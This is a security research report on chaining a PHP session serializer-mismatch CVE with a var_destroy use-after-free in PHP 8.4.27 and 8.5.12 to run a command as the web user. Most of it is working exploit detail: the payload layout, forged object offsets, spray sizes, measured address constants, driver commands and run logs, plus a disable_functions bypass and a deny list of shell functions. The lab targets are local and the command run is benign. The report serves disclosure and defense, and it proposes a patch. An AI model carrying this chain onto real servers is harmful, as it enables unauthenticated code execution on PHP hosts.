# Security report — CVE-2026-115560 as a pre-auth delivery path for the `var_destroy` re-entry UAF on patched PHP 8.4.27 / 8.5.12

**Document ID:** `SECURITY_REPORT_115560`
**Date:** 2026-10-31
**Repository:** `github.com/pax-k/php2shell-hunt`
**Frozen tree:** git HEAD `ed1181edc1ec0d57166e815c3f53bab92b0d95ee`
**Classification:** PUBLISHED RESEARCH REPORT (repo publication, 2026-10-31)
**Evidence grade:** every positive below was produced by a lab command in this
repository; the commands and output are quoted or cited by path. Nothing in this
report is a remote-target result.

---

> ## ⚠️ LAB-ONLY / ETHICS
>
> This report describes a working end-to-end chain against **disposable local
> containers only**. All targets are `127.0.0.1`, `localhost`, or `::1`. The only
> command executed by the forged call is the fixed harmless marker
> **`id>/tmp/vd 2>&1`**. There is **no arbitrary-command interface**, no reverse
> shell, no payload packaging, no scanner, and no remote host in any experiment.
>
> The `var_destroy` carrier technique (carrier placement, measured constants,
> seed/timing, heap shaping) remains **unpublished externally**. The operator
> decision of 2026-10-31 is to **document everything locally** in
> `docs/PUBLICATION_115560/` (`docs/PUBLICATION_DECISION_115560.md`); that
> decision authorizes this local report, not an external send. This file must
> not be sent, posted, committed to a public remote, or shared with a third
> party without a separate explicit decision. See §12 and
> `docs/NOVELTY_115560_2026-10-31.md` §6.
>
> The underlying composition is **already public** (ACD421 `fa_jammy.sh`,
> 2026-10-26). Nothing here is a new vulnerability, a new CVE, a "first", or a
> default-PHP exploit. Read §11 before quoting any claim from this report.

---

## Table of contents

1. [Executive summary](#1-executive-summary)
2. [Scope, ethics, and rules of engagement](#2-scope-ethics-and-rules-of-engagement)
3. [CVE-2026-115560 mechanics](#3-cve-2026-115560-mechanics)
4. [The `var_destroy` re-entry UAF](#4-the-var_destroy-re-entry-uaf)
5. [The composed chain](#5-the-composed-chain)
6. [Payload and carrier geometry](#6-payload-and-carrier-geometry)
7. [Measured constants](#7-measured-constants)
8. [Evidence](#8-evidence)
9. [Real-application profiles](#9-real-application-profiles)
10. [Threat model and deployment realism](#10-threat-model-and-deployment-realism)
11. [Prior art and novelty (with retraction)](#11-prior-art-and-novelty-with-retraction)
12. [Defense and mitigations](#12-defense-and-mitigations)
13. [Limitations and non-claims](#13-limitations-and-non-claims)
14. [Reproduction file map](#14-reproduction-file-map)
15. [Credits](#15-credits)
16. [References](#16-references)

---

## 1. Executive summary

A server configured with `session.serialize_handler=php_serialize`, with
`session.upload_progress.enabled=On`, that also switches the handler to `php`
at runtime before `session_start()`, lets an **unauthenticated** request place
attacker bytes into the session file and have the **session decoder itself**
feed them to `php_var_unserialize()`. On patched PHP **8.4.27** and **8.5.12**
this reaches the public `var_destroy()` delayed-destructor use-after-free, and
with a destructor that sprays a same-size allocation and re-enters
`unserialize()`, the freed `var_entries` chunk is reclaimed by attacker data.
A forged `zend_reference` → `zend_object` → `handlers->dtor_obj = zif_system`
then executes a fixed benign command as the web user (`uid=33`).

**What is proven in this repository**

| # | Result | Builds / profile | Proof |
|---|---|---|---|
| P1 | Direct pre-auth chain, `cleanup=Off` | 8.4.27 `:18200`, 8.5.12 `:18201` | `uid=33(www-data)` |
| P2 | `disable_functions` bypass by the forged `zif_system` | 8.4.27 `:18203` | `uid=33`, direct `system()` fatal |
| P3 | Default `cleanup=On` streaming race | 8.4.27 `:18204` (`0x6d875`), 8.5.12 `:18205` (`0x80875`) | `uid=33` |
| P4 | No-`/proc` full-window `main` scan | 8.4.27 attempt 307 / 1238.8 s; 8.5.12 attempt 351 / 1406 s | `uid=33` |
| P5 | Multi-worker prefork, with and without 7-holder pinning | 8.4.27 `:18206`, 8 children | `uid=33` |
| P6 | amd64/Rosetta layout | 8.4.27 `:18207` | `uid=33` |
| P7 | `__wakeup`/`__unserialize` are **not** a re-entry | 8.4.27 + 8.5.12, 8/8 combinations | negative |
| P8 | Drupal 11.4.11 P5 through the real 115560 decoder | 8.4.27 `:18300`, 8.5.12 `:18301`; race `:18302` | `uid=33` |
| P9 | Roundcube 1.6.11 plugin-assisted profile | 8.4.27 `:18310`, 8.5.12 `:18311` | `uid=33` (simple + terminal) |
| N1 | Stock Roundcube db/redis blocker | SQLite `session_storage='db'` | no progress bytes, no proof |

**What is not claimed:** default PHP (the default handler is `php`, so 115560
does not apply); a default application (no stock app combines the handler switch
with a re-entry destructor); a new composition, primitive, CVE, or
`disable_functions`/pinning technique; native x86-64 generality; a remote-ready
exploit without a carrier seed.

**Novelty status:** the four-stage composition is **public** (ACD421/PHP
`weapons/lab/fa_jammy.sh`, 2026-10-26) and the `cleanup=On` race is public
(`zero1`, 2026-10-21). The prior internal sentence "nobody has published the
composition" is **retracted** (§11.2). The defensible delta is the
patched-build, default-cleanup, arm64 no-`/proc` end-to-end reproduction plus
the measured carrier and constants — an engineering/port result, not a new bug.

---

## 2. Scope, ethics, and rules of engagement

### 2.1 In scope

- Disposable Docker containers built from stock `php:8.4.27-apache` and
  `php:8.5.12-apache` (arm64), plus one `linux/amd64` container under Rosetta.
- Local harness applications (`lab-115560`, `lab-drupal`, `lab-roundcube`) and
  the ASAN image `lab-asan-85x`.
- Read-only source survey of application/framework trees and public prior art.

### 2.2 Out of scope (hard rules from `AGENTS.md`)

- Any host other than `localhost`, `127.*`, `::1`.
- Any command other than `id`, `uname`, `whoami`; the lab uses only
  `id>/tmp/vd 2>&1`.
- Reverse shells, arbitrary command packaging, mass scanning, persistence,
  evasion, or exfiltration.
- Editing `GOAL.md` acceptance, weakening controls, or hand-editing generated
  artifacts.

### 2.3 Evidence rule

A candidate is not a finding until a command in this repository demonstrates it;
a crash is not RCE until the terminal call is shown. Each claim in §8 maps to a
driver, container, port, and observed output. Controls are listed beside every
positive. Where a command was not run (e.g. 8.5.12 on amd64), the report says so
instead of inferring.

### 2.4 Reproducibility basis

The Phase 0 freeze pins the driver and harness hashes so the result is not a
moving target (`docs/PHASE0_115560_FREEZE.md`):

| Item | Frozen value |
|---|---|
| git HEAD | `ed1181edc1ec0d57166e815c3f53bab92b0d95ee` |
| `poc/verify_115560_vardestroy.py` | `692d328072435235057b2daca0d60a467a0d3edd1c4b4c4e73f221f3ee3f91c2` |
| `poc/verify_115560_race.py` | `4e8164627310eb025ce816c6d16b5298de227da5e1c5eda3880889a4d2c82aa3` |
| `lab-115560/webroot/index.php` | `c7ad767e19ab176d24d1b24b3bceda17b3b7b7bf4b544a4e743311146c6c3258` |
| `lab-115560/php-115560.ini` | `997f9bd386bc3d5cd05b097cec42496b077bfa937743e06c9d3fd807b120c6bd` |
| Python / Docker | 3.14.7 / 29.8.2 |

The freeze note also states the key methodological limitation: **driver
constants are per request shape.** A different consumer page (Drupal,
Roundcube) must re-measure `delta`, and `libphp`/`zif_system` must be resolved
for that container. Only the payload/carrier geometry is frozen.

---

## 3. CVE-2026-115560 mechanics

### 3.1 The bug in one sentence

PHP's rfc1867 **upload-progress hook** writes the attacker-controlled
`PHP_SESSION_UPLOAD_PROGRESS` field into the session store using the
**configured writer** (`php_serialize` / `php_binary`), but the application can
later read the same file with the **`php` reader**. The two formats disagree
about `|`: `php_serialize` treats it as ordinary data inside a serialized
string, while the `php` reader treats it as the `name|serialized_value`
delimiter and hands everything after it to `php_var_unserialize()`.

### 3.2 Preconditions

| # | Precondition | Why it is needed |
|---|---|---|
| 1 | `session.serialize_handler = php_serialize` (or `php_binary`) in server config | selects the vulnerable writer; the default is `php`, which does **not** mismatch |
| 2 | Application calls `ini_set('session.serialize_handler','php')` (or `session_start(['serialize_handler'=>'php'])`) **before** `session_start()` | selects the reader that splits at `|` |
| 3 | `session.upload_progress.enabled = On` | installs the pre-auth writer that runs before application code |
| 4 | A loaded class whose `__destruct()` sprays a same-size string and re-enters `unserialize()` | turns the `var_destroy` UAF into a controlled reuse (the bottleneck) |
| 5 | A carrier address seed (or a feasible `main`-window scan) | the forged blob must be reachable at a known address |

Preconditions 1–3 are 115560. Precondition 4 is the `var_destroy` gadget.
Precondition 5 is the exploitation/port problem. The advisory itself describes
the combination as "unlikely in practice"
(`safeguard.sh`, 2026-10-23); the survey in §9 agrees that both halves are rare
and usually live in different applications.

### 3.3 Why the writer and reader disagree

The upload-progress hook stores a session entry whose **key** is
`session.upload_progress.prefix` concatenated with the request field value. When
the value begins with `|`, the key becomes `upload_progress_|<attacker bytes>`.
The `php_serialize` writer serializes the whole `$_SESSION` array, so those
bytes are just characters inside a serialized string:

```text
a:1:{s:<len>:"upload_progress_|a:1018:{i:0;s:4096:"\x00...<blob>...";...}
```

The `php` reader does not parse that array. It scans for the first `|` in each
record and parses the suffix as the session value. The prefix
(`a:1:{s:<len>:"upload_progress_`) is ignored as a name, and the bytes after `|`
become the unserializer input. That is the entire delivery primitive.

### 3.4 Byte flow

```text
attacker multipart POST
  PHP_SESSION_UPLOAD_PROGRESS = "|" + a:1018:{...}
        |
        v
rfc1867 hook (pre-auth, before app code)
  writer = php_serialize
        |
        v
/tmp/sessions/sess_<sid>
  a:1:{s:<len>:"upload_progress_|a:1018:{...}...
        |
        v
application request, same SID
  ini_set('session.serialize_handler','php')
  session_start()
        |
        v
php reader: split at first "|"
        |
        v
php_var_unserialize("a:1018:{...}")   <-- attacker-controlled
```

### 3.5 Format notes that constrain the payload

- **`php_binary`** is named by the advisory but is a poor fit for this ~10 KB
  payload: the filename route truncates at a NUL byte and the progress key is
  capped at 127 bytes (`lab-115560/README.md`).
- **`php_serialize`** keeps the full value and is the profile used here.
- **Filename injection is not required.** The attacker does not choose the
  session filename; only the key/value content is attacker-controlled. This is
  why the chain works with `session.use_strict_mode=0`/`1` as configured in the
  lab (the lab uses `0`).
- **The pre-auth request does not need `session_start()`.** The hook writes the
  file during request startup. The lab's `/prime.php` deliberately omits
  `session_start()` so the upload request does not race the consumer's decode.

---

## 4. The `var_destroy` re-entry UAF

### 4.1 Root cause

`var_destroy()` (generated from `ext/standard/var_unserializer.re`) first frees
every nested `var_entries` extension chunk, then walks the delayed-destructor
list. The `__wakeup` and `__unserialize` branches take `BG(serialize_lock)`
around the magic call, but the final `i_zval_ptr_dtor(zv)` — the destructor
path — runs **unlocked**:

```c
/* var_destroy(), abridged; PHP 8.4.27 / 8.5.12 */
while (var_hash) {                       /* 1. free every var_entries chunk */
    next = var_hash->next;
    efree_size(var_hash, sizeof(var_entries));
    var_hash = next;
}

while (var_dtor_hash) {
    for (i = 0; i < var_dtor_hash->used_slots; i++) {
        zval *zv = &var_dtor_hash->data[i];

        if (Z_EXTRA_P(zv) == VAR_WAKEUP_FLAG) {
            BG(serialize_lock)++;        /* 2. __wakeup under the lock */
            zend_call_function(...);
            BG(serialize_lock)--;
        } else if (Z_EXTRA_P(zv) == VAR_UNSERIALIZE_FLAG) {
            BG(serialize_lock)++;        /* 2. __unserialize under the lock */
            zend_call_known_instance_method_with_1_params(...);
            BG(serialize_lock)--;
        }

        i_zval_ptr_dtor(zv);             /* 3. __destruct UNLOCKED */
    }
}
```

`php_var_unserialize_init()` reuses the stale context only when the lock is zero
and a parse is already active:

```c
if (BG(serialize_lock) || !BG(unserialize).level) {
    /* fresh var_hash */
} else {
    d = BG(unserialize).data;            /* stale, just-freed chain */
    ++BG(unserialize).level;
}
```

So a destructor that calls `unserialize()` re-enters with a **dangling**
`var_entries` chain. `php_var_unserialize()` then reads
`(*var_hash)->last->used_slots` from freed memory (`var_unserializer.c:906` on
8.4.27/8.5.12; `:850` on 8.2.34).

### 4.2 The 1018-element boundary

`struct var_entries` is:

```c
struct var_entries {
    zend_long used_slots;
    void *next;
    zval *data[1018];
};
```

`sizeof` = `16 + 8*1018` = **8160 bytes** (two ZendMM pages). The serialized
array must allocate at least one extension chunk: the measured threshold is
**1018 elements** (1016 scalars + the object + the duplicate key). At 1017
elements no extension chunk is freed and the nested read is not reached (no ASAN
report) (`docs/VAR_DESTROY_UAF.md` §2).

### 4.3 Delayed-destructor list population

| Source | When enqueued | Which magic method is usable |
|---|---|---|
| Overwritten array value (duplicate key) | `var_push_dtor_value()` on a duplicate array key (`process_nested_array_data`) | **`__destruct`** — runs unlocked |
| Overwritten object property | `var_push_dtor_value()` on property overwrite | **`__destruct`** |
| Every object with `__wakeup`/`__unserialize`, any key | `ZVAL_COPY` + flag at parse time | magic call runs **under lock**; not a re-entry |
| Object with both, overwritten | magic call under lock, then reference drop reaches zero | **`__destruct`** runs unlocked afterwards |

A **destructor-only** gadget must therefore be the overwritten value:

```text
a:1018:{ <1016 × i:0;N;>  i:99999;<GADGET GRAPH>  i:99999;i:42; }
```

The gadget root is the value of the first `i:99999`; the second one overwrites
it and enqueues it. Its properties survive until the destructor runs.

### 4.4 Only `__destruct` is a re-entry (verified negative for wakeup)

The `__wakeup`/`__unserialize` hypothesis is **falsified** on both builds. The
delayed call does run from `var_destroy`, but the nested `unserialize('R:1020;')`
returns boolean `false` because the call holds `BG(serialize_lock)` and the
inner parser takes the fresh context branch. 8/8 combinations (both builds ×
wakeup/unserialize × non-dup/dup placement) were negative, while the positive
`__destruct` control on the same carrier and `zif` fired immediately
(`docs/RACE_WAKEUP_115560.md` §B′). A class with both methods is usable **only
through its destructor**.

### 4.5 ASAN evidence

Through the real session decoder (Drupal payload delivered as
`<key>|<value>` and decoded by `session_start()` with `php`):

```text
==1==ERROR: AddressSanitizer: heap-use-after-free ... READ of size 8
    #0 php_var_unserialize /usr/src/php/ext/standard/var_unserializer.c:906
    #13 var_destroy /usr/src/php/ext/standard/var_unserializer.c:319
    #15 ps_srlzr_decode_php /usr/src/php/ext/session/session.c:1176
    #16 php_session_decode /usr/src/php/ext/session/session.c:279
    #17 php_session_initialize /usr/src/php/ext/session/session.c:506
    #18 php_session_start /usr/src/php/ext/session/session.c:1753
0xffffb0a43900 is located 0 bytes inside of 8160-byte region
freed by thread T0 here:
    #2 _efree /usr/src/php/Zend/zend_alloc.c:2888
    #3 var_destroy /usr/src/php/ext/standard/var_unserializer.c:255
previously allocated by thread T0 here:
    #3 var_push /usr/src/php/ext/standard/var_unserializer.c:135
    #4 php_var_unserialize_internal /usr/src/php/ext/standard/var_unserializer.c:943
```

Full log: `/private/var/folders/59/372ydp210wzbvvbgwktc6nmr0000gn/T/opencode/asan_session.log`.

### 4.6 The patch gap

The 2026-10-21 patch for CVE-2026-109618/-109619 does **not** add the lock
around the destructor. The UAF therefore survives patched **8.4.26, 8.4.27 and
8.5.12** (ASAN-confirmed), and 8.2.34 reports the same defect at the older line
number. This is a separate public memory-safety issue, not a 115560 bug; PHP has
a stated policy of not issuing CVEs for `unserialize()` memory-corruption bugs.
Proposed fix: hold `BG(serialize_lock)` across `i_zval_ptr_dtor(zv)` in
`var_destroy()` and add an ASAN regression test
(`docs/VAR_DESTROY_UAF.md` §6).

---

## 5. The composed chain

### 5.1 Stages

```text
[1] pre-auth upload                       attacker, unauthenticated
    PHP_SESSION_UPLOAD_PROGRESS = "|" + a:1018:{...}
        |
[2] php_serialize write                   rfc1867 session hook
    /tmp/sessions/sess_<sid> gets the key
    upload_progress_|a:1018:{...}
        |
[3] runtime handler switch + decode       victim request, same SID
    ini_set('session.serialize_handler','php'); session_start()
    php reader splits at "|" -> php_var_unserialize(a:1018:{...})
        |
[4] var_destroy UAF                       session decoder
    frees 8160-byte var_entries chunk
    walks delayed dtor list -> CachePurge::__destruct (unlocked)
        |
[5] dtor spray + re-entry                 attacker gadget
    64 same-size strings; first 8 bytes = key pointer
    @unserialize('R:1020;') reads the freed chunk
        |
[6] forged object terminal                attacker data
    R:1020 -> stale var_entries slot -> fake zval(IS_REFERENCE)
      -> fake zend_reference (refcount 0)
      -> fake zend_object / execute_data
      -> handlers->dtor_obj = zif_system
      -> system("id>/tmp/vd 2>&1")
        |
[7] proof                                 /tmp/vd
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5.2 Why this is different from the public simple-gadget path

| Property | Public 115560 simple gadget (B63, googlesky) | This chain |
|---|---|---|
| Terminal | `__destruct { exec/system/shell_exec(...) }` | forged `dtor_obj = zif_system` |
| Memory corruption | none | `var_destroy` UAF + controlled reuse |
| `disable_functions=system,...` | blocks it (function table stub) | **does not block** (direct C call) |
| App `unserialize()` sink | not needed | not needed (session decoder is the sink) |
| Gadget requirement | common destructor | rarer `spray + re-enters unserialize()` destructor |
| Address seed | none | carrier address (arm64 512-slot window; x86-64 needs a leak) |

The important property is that the **session decoder is the
`unserialize()` sink**. Application-level `unserialize()` hardening,
`allowed_classes => false` in application code, and app input validation do not
apply to this path, because the call happens inside `php_session_start()`.

### 5.3 Where the attacker controls data

| Stage | Attacker-controlled | Not controlled |
|---|---|---|
| upload | progress field value (full bytes after `|`), SID cookie, timing | session filename, save path |
| write | session key suffix = prefix + value | serialized-array wrapper |
| decode | entire `a:1018:{...}` graph including class names/properties | which class is autoloadable |
| dtor | `key` property (8 raw pointer bytes), `R:` id, spray length | allocator behavior (measured) |
| terminal | forged blob contents (offsets fixed by build/arch) | code addresses (measured/seeded) |

### 5.4 Trust boundary

The chain crosses from **unauthenticated HTTP input** to **native code
execution in the web worker** without an application-level deserialization
call. The victim only has to serve one request on the same session after the
progress write. No login, no file write by the attacker, no upload of a PHP
file, and no `include`/LFI are required.

---

## 6. Payload and carrier geometry

### 6.1 Serialized array shape

The exploit value is a 1018-element serialized array with a forged blob embedded
as a 4096-byte string (the carrier region) and a destructor object at a
duplicate key:

```text
a:1018:{
  i:0;s:4096:"<0x1000-byte forged blob>";   <- carrier string
  i:0;N;  × 1015                             <- padding + duplicate-key pressure
  i:99999;O:10:"CachePurge":1:{s:3:"key";s:8:"<8-byte pointer>";}
  i:99999;i:42;                              <- overwrite -> enqueue the dtor
}
```

- The **prefix** before the blob is exactly `a:1018:{i:0;s:4096:"` (20 bytes,
  `DOFF = 0x14`). The blob is therefore at `value_string + 0x14`.
- The forged blob is `0x1000` bytes. Internal offsets are fixed:

| Offset in blob | Content | Purpose |
|---|---|---|
| `0x000` | `CARRIERMAGIC0000` + filler | marker used by the `/proc` scanner |
| `0x100` | fake `zval` (`IS_REFERENCE`, refcounted) | value returned by `R:` |
| `0x200` | fake `zend_reference`: refcount **0**, `GC_REFERENCE`=26, value → object | forces `zend_reference_destroy` on drop |
| `0x300` | fake `zend_object` doubling as `zend_execute_data`; `handlers` → `0x400` | object whose `dtor_obj` is called |
| `0x400` | fake handlers table; `dtor_obj = zif_system` at `+0x10` | indirect C call |
| `0x500` | fake `zend_string` header + `id>/tmp/vd 2>&1` at `+0x18` | argument 1 |
| `0x300+80` | `zend_execute_data` arg 1 zval → fake string | calling convention |

### 6.2 The 8160-byte spray

The reclaim allocation must match `sizeof(var_entries)` = **8160 bytes**.

- 8.5.12: `s=8135` → `zend_string_alloc` requests `24 + 8135 + 1 = 8160` bytes.
  The string's first 8 bytes land at chunk+24, i.e. the slot `R:1020`
  dereferences; those bytes are the `key` property, set to
  `carrier + 0x100` (the fake zval pointer).
- 8.4.27 direct: the driver uses `s=3048` → `3048 + 24 + 1 = 3073` bytes
  (one page). The allocator can start that string at the page-aligned freed
  chunk base, so the key lands in the right slot; `s=8135` on 8.4.27 can
  coalesce/split so the string base precedes the chunk and the re-entry reads
  `0x41…` and crashes (`lab-115560/README.md` "Spray size class").
- The destructor allocates **64** such strings and rewrites the first 8 bytes of
  each to the token, so a best-fit allocator has multiple chances to hand back
  the freed chunk.

### 6.3 Why `R:1020`

`var_access()` returns `data[id]` as a `zval *`, and the array has 1018 slots
per chunk. Reference id **1020** walks past the first chunk into the freed
extension chunk. The reclaimed chunk's `used_slots` and `data[]` now come from
the spray bytes, so the engine dereferences the attacker pointer at the slot the
spray fills. Uppercase `R:` is required: lowercase `r:` calls `var_push` first,
which writes at `used_slots` read from the reclaimed header (a wild write).

### 6.4 Carrier placement: raw session input buffer, not the string copy

The carrier is the **persistent raw session input buffer** (the bytes after
`|`), not the `s:4096` `zend_string` copy. The copy is freed when the first
duplicate `i:0` is parsed, long before the dtor fires at `i:99999`. The lab
scanner distinguishes them by requiring `a:1018:{i:0;s:4096:"` immediately
before the blob (`scan_prefix.php`). Measured relation for the lab request shape:

```text
carrier = value_string + 0x14
delta   = value_string - main
```

### 6.5 Two records and the `inv=1` dry destructor

On 8.4.27 the decoder produces two destructor invocations:

- `inv=1` — the mid-parse duplicate-key destroy (dry; no UAF yet);
- `inv=2` — the decode-failure `var_destroy` destructor (real UAF).

The lab consumer uses `?m=5` to hold at the real dtor for measurement and
`?m=4` to skip the dry one and fire at the real one. A single clean session
record lets 8.4.27's decode succeed, so only the dry dtor fires; a second
record is needed. `/prime.php` writes one valid dummy record without
`session_start()`; the exploit request appends the real record.

### 6.6 `cleanup=On` and the two-record seed

With the default `cleanup=On`, the progress record is erased at
`MULTIPART_EVENT_END`. A `/prime.php` dummy is therefore gone (`a:0:{}`) before
the consumer reads it. The race profile uses `seed.php?d=1`, which persists a
normal session variable whose **value** starts with `"|" + valid a:1018 dummy`.
The consumer's `php` decoder parses the dummy as record #1 (queueing `inv=1`),
then reaches the streamed progress key's `|` and parses the exploit as record #2
(`inv=2`). The seed key survives cleanup because it is not an
`upload_progress_*` key. Without the seed, only `inv=1` exists and the chain
does not fire (`--no-seed` control).

### 6.7 Force a decode failure

Some builds ignore trailing serializer junk, so the decode can succeed and only
the dry destructor fires. The driver appends an invalid token **inside** the
array (`force_fail()`), after the `CachePurge` object has been parsed and its
destructor registered. That guarantees the decode-failure `var_destroy` path on
which `inv=2` depends.

---

## 7. Measured constants

All offsets are for the request shape named in the row. **Never reuse a delta
across builds, arches, applications, or request shapes.** The Phase 0 note is
explicit: re-measure `delta` and resolve `libphp`/`zif_system` per container.

### 7.1 Direct lab profile (`cleanup=Off`, arm64, `/index.php`)

| Build | `delta` | spray `s` | `lib − main` | `zif_system` offset | fire mode | ref |
|---|---|---|---|---|---|---|
| 8.4.27 | `0x6c019` | `3048` | `+0x2130000` | `0x431510` | 4 | `1020` |
| 8.5.12 | `0x6c019` | `8135` | `-0x3600000` | `0x535490` | 4 | `1020` |

Dry mid-parse delta on 8.4.27: `0x69037` (diagnostic only; not the fire delta).

### 7.2 `cleanup=On` race profile (arm64, streaming upload + `seed.php`)

| Build | `delta` | cold-start first measure | spray |
|---|---|---|---|
| 8.4.27 | `0x6d875` | `0x8c875` (+0x20000 typical) | `3048` |
| 8.5.12 | `0x80875` | `0x9e875` (+0x1e000..0x20000) | `8135` |

Timing: 8 × 64 KiB chunks, 0.6 s apart (~4.8 s live window), consumer
`settle=0.7 s`, fresh SID per attempt. The driver re-measures after a miss.

### 7.3 Drupal 11.4.11 P5 (arm64)

| Item | Value |
|---|---|
| payload length | `69819` |
| `cid_len` | `8102` |
| `nk` (string-keyed entries) | `65` |
| `npad` (late 8160-byte strings) | `4` |
| direct `delta` (8.4.27 / 8.5.12) | `0x7b019` / `0x7b019` |
| race `delta` (8.4.27) | `0x7b875` |
| lock-name allocation | `24 + 8135 + 1 = 8160` |
| `zif_system` (8.4.27 / 8.5.12) | `0xffffa1401510` / `0xffff7ef35490` |

### 7.4 Roundcube 1.6.11 plugin profile (arm64)

| Build | main | lib | `zif_system` | `delta` | spray |
|---|---|---|---|---|---|
| 8.4.27 | `0xffffab600000` | `0xffffad780000` | `0xffffadbb1510` | `0x8d9c1` | `3048` |
| 8.5.12 | `0xffff81c00000` | `0xffff7e600000` | `0xffff7eb35490` | `0x9e9c1` | `8135` |

Candidate deltas on 8.4.27: `0x799c1`, `0x80029`, `0x8d9c1` (lowest is released
before the real dtor). On 8.5.12: `0x799c1`, `0x80029`, `0x859c1`, `0x9e9c1`;
the **highest** fires. The driver selects hits whose 17 preceding bytes are
`upload_progress_|` and takes the highest address.

### 7.5 Multi-worker / arch geometry

| Quantity | arm64 8.4.27 (8 workers) | amd64 8.4.27 (Rosetta) |
|---|---|---|
| `main` | `0xffffaf000000` | `0x7ffffc400000` |
| `libphp` base | `0xffffb10f0000` | `0x7ffffe007000` |
| `lib − main` | `0x20f0000` | `0x1c07000` |
| `zif_system` offset | `0x431510` | `0x46ad70` |
| carrier `delta` | `0x6c019` | `0x6c019` |

The `delta` is arch-independent for this request shape; `lib − main` and the
`zif` offset are **per-arch and per-build**. Native x86-64 at
`mmap_rnd_bits=28` has ~`2^19` 2 MiB slots and is not brute-forceable; the
Rosetta target is deterministic because Rosetta fixes the guest layout.

---

## 8. Evidence

Every subsection states the exact command, target, and observed result. Logs
are in the lab directories and in the cited docs; the frozen positives are also
in `docs/PHASE0_115560_FREEZE.md`.

### 8.1 Gate G0 — Phase 0 freeze

**Claim:** four positives and all listed controls reproduced on the frozen tree.

| # | Build | Target / container | Mode | Result |
|---|---|---|---|---|
| 1 | 8.4.27 | `127.0.0.1:18200` / `php2shell-115560-8427` | direct `run` | `main=0xffff9e400000 lib=0xffffa0530000 zif=0xffffa0961510 delta=0x6c019` → `uid=33` |
| 2 | 8.5.12 | `127.0.0.1:18201` / `php2shell-115560-8512` | direct `run` | `main=0xffffa3c00000 lib=0xffffa0600000 zif=0xffffa0b35490 delta=0x6c019` → `uid=33` |
| 3 | 8.4.27 | `127.0.0.1:18203` / `php2shell-115560-8427-nofunc` | `run`, `disable_functions` | `zif=0xffff89fc1510` → `uid=33` |
| 4 | 8.4.27 | `127.0.0.1:18204` / `php2shell-115560-8427-race` | `--settle 0.7 --attempts 3 run` | `delta=0x6d875` → `uid=33` |
| 5 | 8.5.12 | `127.0.0.1:18205` / `php2shell-115560-8512-race` | same | `delta=0x80875` → `uid=33` |

Commands (frozen driver):

```bash
python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18200 \
  --container php2shell-115560-8427 --build 8.4.27 run
python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18201 \
  --container php2shell-115560-8512 --build 8.5.12 run
python3 poc/verify_115560_race.py --target 127.0.0.1:18204 \
  --container php2shell-115560-8427-race --build 8.4.27 \
  --settle 0.7 --attempts 3 run
```

### 8.2 Direct pre-auth chain, 8.4.27 and 8.5.12

**Claim:** the session decoder decodes the attacker array and the forged
`zif_system` writes `uid=33`, with no application `unserialize()` sink.

8.4.27 observed:

```text
[m] magic hits=7 raw-input=6
[m] pid=238 main=0xffff87a00000 lib=0xffff89b90000 zif=0xffff89fc1510
[m] magic=0xffff87a6c82d carrier=0xffff87a6c02d value_string=0xffff87a6c019 delta=0x6c019
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> var_destroy -> uid=33
```

8.5.12 observed (direct): `main=0xffffa3c00000`, `lib=0xffffa0600000`,
`zif=0xffffa0b35490`, `delta=0x6c019`, proof `uid=33`. The empty HTTP response
is expected: the worker is corrupted immediately after `zif_system` returns;
`/tmp/vd` is the terminal evidence.

Destructor log shape on 8.4.27:

```text
dtor m=5 inv=1 pid=238
skip-first
dtor m=5 inv=2 pid=238
second-measure-sleep
dtor m=4 inv=1 pid=278
skip-first
dtor m=4 inv=2 pid=278
spray-done
ref=1020
after-unserialize
fire-end
```

### 8.3 `disable_functions`-hardened target (action C)

**Claim:** `disable_functions` does not stop the forged `zif_system`; it only
stops the public simple-gadget path.

Target `127.0.0.1:18203`, container `php2shell-115560-8427-nofunc`, ini
`lab-115560/php-115560-nofunc.ini` with:

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec
```

Hardening verified through both SAPIs:

```text
bool(false)   # function_exists("system")
bool(false)   # function_exists("shell_exec")
disable_functions=system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec
Fatal error: Uncaught Error: Call to undefined function system() ...
(no /tmp/vd_cli — blocked)
```

mod_php probe: `sapi=apache2handler`, same `disable_functions`,
`function_exists(system)=false`, direct `system()` blocked, no proof file.

Forged chain:

```text
[m] pid=238 main=0xffff87a00000 lib=0xffff89b90000 zif=0xffff89fc1510
[m] magic=0xffff87a6c82d carrier=0xffff87a6c02d value_string=0xffff87a6c019 delta=0x6c019
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
--- /tmp/vd ---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Control with the same addresses and `--bias-zif 0x1000`:

```text
[!] BIAS zif by 0x1000 (control: must not fire)
[f] response=<none> proof=''
[!] no proof written
```

### 8.4 Default `cleanup=On` streaming race (action A)

**Claim:** the chain lands with the default cleanup setting, not only the
`cleanup=Off` lab profile.

Mechanism: streaming multipart POST to `/prime.php` sends
`PHP_SESSION_UPLOAD_PROGRESS = "|" + payload`, then 8 × 64 KiB file chunks with
0.6 s delays. The rfc1867 hook writes the progress record under `php_serialize`;
with `cleanup=On` it is erased only at `MULTIPART_EVENT_END`. After
`settle=0.7 s`, a concurrent GET to `/index.php?m=5` (measure) or `?m=4` (fire)
with the same `PHPSESSID` reads the live file. The pool must have more than one
child; `apache-race.conf` uses 4–8 prefork children with
`MaxConnectionsPerChild=1`.

8.4.27 observed:

```text
[*] 115560 cleanup=On race (8.4.27)
    settle=0.7s chunks=8x64KiB delay=0.6s window~4.8s spray=3048
[m] dtor_log='dtor m=5 inv=1 pid=71\nskip-first\ndtor m=5 inv=2 pid=71\nsecond-measure-sleep'
[m] magic hits=2 raw-input=1
[m] pid=71 main=0xffff90200000 lib=0xffff922b0000 zif=0xffff926e1510
[m] carrier=0xffff9026d889 value_string=0xffff9026d875 delta=0x6d875
[f] consumer=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[f] dtor_log='dtor m=4 inv=1 pid=128\nskip-first\ndtor m=4 inv=2 pid=128\nspray-done\nref=1020\nafter-unserialize\nfire-end'
[EVIDENCE] cleanup=On race -> 115560 var_destroy -> uid=33
```

8.5.12 observed: `dtor_log` with `inv=1`/`inv=2`, `main=0xffffb4c00000`,
`lib=0xffffb1600000`, `zif=0xffffb1b35490`, `delta=0x80875`, proof `uid=33`.
